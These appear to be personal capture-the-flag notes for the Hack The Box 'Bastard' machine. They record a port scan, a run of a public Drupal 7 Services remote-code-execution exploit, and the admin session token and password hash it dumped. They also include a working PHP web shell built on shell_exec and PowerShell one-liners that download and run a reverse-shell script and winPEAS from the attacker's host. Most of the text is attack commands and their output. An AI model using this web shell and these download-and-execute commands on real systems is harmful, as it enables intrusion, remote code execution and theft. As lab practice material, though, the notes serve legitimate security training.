PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

IIS 7.5 is windows 7 and 2008


┌──(kali㉿kali)-[~/htb/bastard]
└─$ php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
ls
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/dixuSOspsOUU.php

┌──(kali㉿kali)-[~/htb/bastard]
└─$ ls
10.10.10.9.gnmap  10.10.10.9.nmap  10.10.10.9.xml  41564.php  44449.rb  dirsearch.py  session.json  user.json

┌──(kali㉿kali)-[~/htb/bastard]
└─$ cat session.json             
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "6CpYX40TSMheP4TuNzonHmvHsVwMtdE1ss72gNQG7Fw",
    "token": "hvSOKVwVbBNGfdmTz-6WjDJFk6sRb5JeZ1TDuaa0ACY"
}                                                                                                                     
┌──(kali㉿kali)-[~/htb/bastard]
└─$ cat user.json   
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1492102672",
    "login": 1624542274,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}                                                                                                                     


open inspector > storage > cookies 
name : session
value : session id


logged in as admin > click modules > add content > basic page  (rmb to on php filter first)

<?php if (isset($_REQUEST['fupload'])) {
   file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.22:1337/" . $_REQUEST['fupload']));
};

if (isset($_REQUEST['fexec'])) {
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};

?>


http://10.10.10.9/node/2?fexec=systeminfo

System Type:               x64-based PC


setup smb server to download nc64.exe then run 

http://10.10.10.9/node/2?fexec=\\10.10.14.22\share\Invoke-PowerShellTcp.ps1

powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')

IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.22:8000/winPEAS.bat')


Invoke-WebRequest -Uri 10.10.14.22:8000/winPEAS.bat -OutFile C:\inetpub\temp

Invoke-WebRequest -Uri "http://10.10.14.22:8000/winPEAS.bat" -OutFile "C:\inetpub\temp"